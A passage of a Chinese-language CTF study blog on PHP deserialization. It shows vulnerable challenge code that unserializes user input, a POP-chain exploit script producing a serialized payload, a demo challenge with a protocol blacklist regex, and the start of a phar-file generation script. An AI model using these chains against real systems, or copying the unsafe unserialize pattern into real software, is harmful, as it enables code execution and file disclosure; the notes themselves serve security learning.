<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">eeee</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$obj</span><span style="color:#d4d4d4">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__clone</span><span style="color:#d4d4d4">()</span></span>
<span class="line"><span style="color:#d4d4d4">    {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">obj</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">cmd</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"success"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'pop'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">unserialize</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'pop'</span><span style="color:#d4d4d4">]);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure> <p>2. 找 pop 链</p> <figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="dark-plus shiki"><code><span class="line"><span style="color:#d4d4d4">先找魔术方法，__destruct，__isset，__toString，__invoke，__clone</span></span>
<span class="line"><span style="color:#d4d4d4">__destruct()	//对象被销毁时触发</span></span>
<span class="line"><span style="color:#d4d4d4">__isset( $property ) 当在一个未定义的属性上调用isset()函数时调用此方法</span></span>
<span class="line"><span style="color:#d4d4d4">__toString方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时</span></span>
<span class="line"><span style="color:#d4d4d4">__invoke 当尝试以调用函数的方式调用一个对象时，__invoke 方法会被自动调用。</span></span>
<span class="line"><span style="color:#d4d4d4">__clone   使用clone方法复制一个对象时，对象会自动调用__clone魔术方法</span></span>
<span class="line"><span style="color:#d4d4d4">先看入口：__destruct方法，出口粗看一眼大概率就是__invoke,现在就是要构造一条从入口到出口的pop链。</span></span>
<span class="line"><span style="color:#d4d4d4">__call( $method, $arg_array ) 当调用一个未定义(包括没有权限访问)的方法是调用此方法</span></span>
<span class="line"><span style="color:#d4d4d4">寻找链条：</span></span>
<span class="line"><span style="color:#d4d4d4">__destruct(Start)方法里有echo，触发__toString(Sec)，toString里的check可以触发__call(Eazy),__call里面用了clone函数，触发了__clone(eeee)方法，调用了isset函数，isset函数又恰好调用了未定义属性cmd，触发了__isset()魔术方法,__isset(Start)里以函数的形式可以调用一个对象，只需要把一个对象赋值给$func变量就可以触发__invoke(Sec)方法了。</span></span>
<span class="line"><span style="color:#d4d4d4">Start-&gt;__destruct 触发 Sec-&gt;__toString 触发 Easy-&gt;__call</span></span>
<span class="line"><span style="color:#d4d4d4">触发 eeee-&gt;__clone 触发 Start-&gt;__isset 触发 Sec-&gt;invoke</span></span></code></pre></div></div></figure> <p>3.exp (exp 写不出来，看了别人的自己复现出的，多看几遍)</p> <figure class="php shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div><div class="code"><pre class="dark-plus shiki"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">Start</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$name</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">protected</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$func</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__construct</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">func</span><span style="color:#d4d4d4">=</span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">Sec</span><span style="color:#d4d4d4">();  </span><span style="color:#6a9955">//因为要触发invoke，invoke在Sec类里</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">Sec</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">private</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$obj</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$var</span><span style="color:#d4d4d4">;    </span><span style="color:#6a9955">//不是很理解为什么这里可以改成public</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__construct</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">obj</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">Easy</span><span style="color:#d4d4d4">();    </span><span style="color:#6a9955">//触发 Easy-&gt;__call,call传两个参数，触发__clone是取决于var参数</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">Easy</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$cla</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">eeee</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$obj</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">=</span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">Start</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#9cdcfe">$b</span><span style="color:#d4d4d4">=</span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">Sec</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#9cdcfe">$c</span><span style="color:#d4d4d4">=</span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">Easy</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#9cdcfe">$d</span><span style="color:#d4d4d4">=</span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">eeee</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">name</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$b</span><span style="color:#d4d4d4">;    </span><span style="color:#6a9955">//可以触发 Sec-&gt;__toString，所以写这里</span></span>
<span class="line"><span style="color:#9cdcfe">$d</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">obj</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">;     </span><span style="color:#6a9955">//因为要触发 Start-&gt;__isset</span></span>
<span class="line"><span style="color:#9cdcfe">$b</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">var</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$d</span><span style="color:#d4d4d4">;     </span><span style="color:#6a9955">//触发eeee-&gt;__clone</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">urlencode</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">serialize</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$d</span><span style="color:#d4d4d4">));</span><span style="color:#6a9955">//$d传参进去马上被反序列化，因为$d-&gt;obj=$a，所以直接触发Start-&gt;__destruct</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">//Start-&gt;__destruct 触发 Sec-&gt;__toString 触发 Easy-&gt;__call</span></span>
<span class="line"><span style="color:#6a9955">//触发 eeee-&gt;__clone 触发 Start-&gt;__isset 触发 Sec-&gt;invoke</span></span></code></pre></div></div></figure> <h3 id="写个demo题试试水以后补充"><a class="markdownIt-Anchor" href="#写个demo题试试水以后补充"></a> 写个 demo 题试试水 (以后补充)</h3> <figure class="php shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></div><div class="code"><pre class="dark-plus shiki"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#6a9955">//flag is in flag.php</span></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">Read</span><span style="color:#d4d4d4"> {</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$var</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">file_get</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$value</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#d4d4d4">    {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$text</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">base64_encode</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">file_get_contents</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$value</span><span style="color:#d4d4d4">));</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$text</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__invoke</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$content</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">file_get</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">var</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$content</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">Show</span></span>
<span class="line"><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$source</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$str</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__construct</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">'index.php'</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#d4d4d4">    {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">source</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">source</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">'Welcome'</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">"&lt;br&gt;"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__toString</span><span style="color:#d4d4d4">()</span></span>
<span class="line"><span style="color:#d4d4d4">    {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">str</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'str'</span><span style="color:#d4d4d4">]-&gt;</span><span style="color:#9cdcfe">source</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">_show</span><span style="color:#d4d4d4">()</span></span>
<span class="line"><span style="color:#d4d4d4">    {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/gopher|http|ftp|https|dict|</span><span style="color:#d7ba7d">\.\.</span><span style="color:#d16969">|flag|file/i'</span><span style="color:#d4d4d4">,</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">source</span><span style="color:#d4d4d4">)) 		 {</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'hacker'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        } </span><span style="color:#c586c0">else</span><span style="color:#d4d4d4"> {</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">source</span><span style="color:#d4d4d4">); </span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__wakeup</span><span style="color:#d4d4d4">()</span></span>
<span class="line"><span style="color:#d4d4d4">    {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">"/gopher|http|file|ftp|https|dict|</span><span style="color:#d7ba7d">\.\.</span><span style="color:#d16969">/i"</span><span style="color:#d4d4d4">, </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">source</span><span style="color:#d4d4d4">)) {</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"hacker"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">source</span><span style="color:#d4d4d4"> = </span><span style="color:#ce9178">"index.php"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">Test</span></span>
<span class="line"><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$p</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__construct</span><span style="color:#d4d4d4">()</span></span>
<span class="line"><span style="color:#d4d4d4">    {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">p</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">array</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__get</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$key</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#d4d4d4">    {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$function</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">p</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$function</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'hello'</span><span style="color:#d4d4d4">]))</span></span>
<span class="line"><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">unserialize</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'hello'</span><span style="color:#d4d4d4">]);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#c586c0">else</span></span>
<span class="line"><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$show</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">Show</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'pop3.php'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$show</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">_show</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure> <p>2. 找出魔术方法，构造 pop 链</p> <h2 id="phar反序列化"><a class="markdownIt-Anchor" href="#phar反序列化"></a> phar 反序列化</h2> <p>phar 是一种 php 程序的一种打包文件，类似与 java 中的 jar 文件，无需解压，直接通过 phar:// 伪协议读取内容。</p> <p>一个 phar 文件一般有四个部分：</p> <figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="dark-plus shiki"><code><span class="line"><span style="color:#d4d4d4">1.stub:它是phar文件的文件头，格式为xxxxx&lt;?php xxx; __HALT_COMPILER();?&gt;,这种格式是固定的。前面的可以不管，但必须以__HALT_COMPILER();?&gt;结尾。生成文件的后缀名为phar。这种格式就相当于gif图片中的GIF89a一样。没有这个格式就不会识别这是一个phar文件。</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">2.a manifest describing the contents:phar文件中被压缩的文件的一些信息，以及一些权限信息。其中Meta-data部分的信息会进行序列化并储存，这就是phar反序列化的精髓。我们可以把exp放在Meta-data内。</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">3.the file contents:这里放的是压缩文件的内容，这里的内容可以随便写</span></span>
<span class="line"><span style="color:#d4d4d4"></span></span>
<span class="line"><span style="color:#d4d4d4">4.a signature for verifying Phar integrity 这是一个签名，在这里不用管。(签名就是对全文进行加密，为了防止文件内容丢失或者修改，如果签名进行解密与全文不匹配，就会拒绝解析。)</span></span></code></pre></div></div></figure> <p>phar 伪协议</p> <p>因为 phar 就是将多个文档压缩到一个文件当中，phar 文件中的 Mata-data 会进行序列化，在我们访问 phar 文件中的文档时，我们不需要对它进行解压。可以通过 phar:// 为协议对文件进行读取。当 phar 文件被解析时，Meta-data 中的数据就会被反序列化。</p> <p>构造 phar 文件</p> <p>在本地生成一个 phar 文件，并想使用 phar 类里面的方法，就必须 ** 将 php.ini 配置文件中的 phar.readonly 改为 0 或者 off（前面分号是注释，删掉）** 这个 phar 压缩文件并不是右键点击一键生成的，而是通过写脚本来生成这个 phar 文件的。</p> <p>接下来在本地实验生成 phar 文件。</p> <figure class="php shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div><div class="code"><pre class="dark-plus shiki"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">A</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__destruct</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">name</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">testobj</span><span style="color:#d4d4d4">();</span></span>
<span class="line"></span>
<span class="line"><span style="color:#9cdcfe">$phar</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">phar</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'test.phar'</span><span style="color:#d4d4d4">);</span><span style="color:#6a9955">//对phar对象进行实例化，以便后续操作。</span></span>
<span class="line"></span>
<span class="line"><span style="color:#9cdcfe">$phar</span><span style="color:#d4d4d4"> -&gt; </span><span style="color:#dcdcaa">startBuffering</span><span style="color:#d4d4d4">();</span><span style="color:#6a9955">//缓冲phar写操作（不用特别注意）</span></span>
<span class="line"></span>
